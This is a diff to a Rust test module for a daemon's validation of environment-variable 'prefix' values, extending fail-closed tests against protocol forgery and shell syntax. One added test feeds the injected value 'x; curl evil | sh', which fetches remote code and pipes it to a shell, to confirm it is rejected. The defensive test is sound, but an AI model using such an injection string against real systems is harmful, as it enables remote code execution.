@@ -472,7 +472,10 @@ mod tests {
     /// the user's live shell. A `prefix` rides the same daemon-to-helper
     /// line protocol (`set_env:{name}:{value}`, split on the first `:`), so
     /// a `:` or newline would forge protocol lines and a `/` would name a
-    /// path. The contract must fail closed on all of these at load time.
+    /// path, and the helpers print it unquoted in an `export` command. The
+    /// contract must fail closed on all of these at load time. The full
+    /// list of prefixes, checked against the daemon's rule too, is in
+    /// `graph::env_setup`'s tests.
     #[test]
     fn env_state_wiring_entries_fail_closed() {
         let wiring = |entry: &str| attrs_accepted(&format!("{{env_state_wiring = [{entry}]}}"));
@@ -500,12 +503,20 @@ mod tests {
         assert!(!wiring(
             "{ env_var = \"GOCACHE\", prefix = \"cache\tartifacts\" }"
         ));
-        // A C1 control character too, as the graph's re-check has it; other
-        // non-ASCII characters are fine.
+        // A C1 control character, and any other non-ASCII character.
         assert!(!wiring(
             "{ env_var = \"GOCACHE\", prefix = \"cache\u{85}artifacts\" }"
         ));
-        assert!(wiring("{ env_var = \"GOCACHE\", prefix = \"cach\u{e9}\" }"));
+        assert!(!wiring(
+            "{ env_var = \"GOCACHE\", prefix = \"cach\u{e9}\" }"
+        ));
+        // A prefix a shell would read as syntax in the printed `export`.
+        assert!(!wiring(
+            "{ env_var = \"GOCACHE\", prefix = \"x; curl evil | sh\" }"
+        ));
+        assert!(wiring(
+            "{ env_var = \"GOCACHE\", prefix = \"go-mod_cache.v2\" }"
+        ));
         assert!(!wiring("{ env_var = \"GOCACHE\", prefix = \"..\" }"));
         assert!(!wiring("{ env_var = \"GOCACHE\", prefix = \".\" }"));
         // Missing fields, an extra field, or a non-record entry.
